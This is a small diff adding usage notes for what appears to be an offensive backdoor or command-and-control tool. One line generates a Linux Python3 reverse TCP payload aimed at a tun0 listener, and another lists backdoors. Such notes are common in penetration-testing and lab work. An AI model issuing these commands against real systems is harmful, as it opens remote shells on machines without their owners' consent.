@@ -1,0 +1,5 @@
+#to generate a payload for linux 
+generate payload=linux/reverse_tcp/python3 lhost=tun0
+
+#to check all backdoors
+backdoors
